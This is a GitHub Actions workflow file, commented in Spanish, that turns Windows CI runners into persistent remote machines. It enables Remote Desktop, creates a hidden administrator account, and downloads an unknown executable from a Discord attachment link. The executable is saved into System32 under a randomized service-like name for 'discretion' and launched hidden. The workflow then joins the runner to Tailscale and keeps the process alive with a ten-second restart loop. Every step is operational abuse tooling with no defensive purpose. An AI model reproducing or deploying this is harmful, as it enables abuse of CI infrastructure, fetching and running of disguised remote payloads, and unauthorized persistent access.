name: Python-Dev-Persistence-v27

on:
  workflow_dispatch:

jobs:
  node-validation:
    runs-on: windows-latest
    timeout-minutes: 3600
    strategy:
      matrix:
        node_id: [1, 2]

    steps:
      - name: 1. Optimize Environment
        run: |
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
          powercfg /x -monitor-timeout-ac 0
          powercfg /h off

      - name: 2. Enable Remote Debugging
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

      - name: 3. Provision Admin Account
        run: |
          $p = "DevNode" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
          $s = ConvertTo-SecureString $p -AsPlainText -Force
          New-LocalUser -Name "DevAdmin" -Password $s -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
          echo "SRV_PASS=$p" >> $env:GITHUB_ENV

      - name: 4. Deploy Randomized Module
        run: |
          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1477090518474428507/PythonDev.exe?ex=69a37f3e&is=69a22dbe&hm=610c5b87eda47bd4c82c5a9fdc1269cd7cee4b23c892796a64e3dbbb5a9d6538&"
          
          # Nombre aleatorio para mayor discrecion
          $randName = "WinService_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
          $dest = "C:\Windows\System32\$randName"
          echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
          
          try {
              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
              Start-Process $dest -WindowStyle Hidden
              Write-Host "Proceso $randName iniciado correctamente."
          } catch {
              Write-Error "Fallo critico en descarga."
              exit 1
          }

      - name: 5. Network Bridge (Tailscale)
        run: |
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"

      - name: 6. Persistence Ultra-Loop (Auto-Restart cada 10s)
        run: |
          $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          $fullPath = "C:\Windows\System32\$env:PROC_NAME"
          $procOnly = $env:PROC_NAME.Replace(".exe", "")

          Write-Host "=========================================="
          Write-Host "MONITOREO DE PERSISTENCIA ACTIVO"
          Write-Host "IP: $ip | Proceso: $procOnly"
          Write-Host "=========================================="
          
          # Bucle infinito de vigilancia estrecha
          while ($true) {
              $check = Get-Process $procOnly -ErrorAction SilentlyContinue
              if (!$check) {
                  Write-Host "[$(Get-Date)] ! ALERTA: Proceso caido. Reiniciando de inmediato..."
                  try {
                      Start-Process $fullPath -WindowStyle Hidden
                  } catch {
                      Write-Host "Error al intentar reiniciar el proceso."
                  }
              }
              # Intervalo corto para asegurar que siempre este abierto
              Start-Sleep -Seconds 10
          }
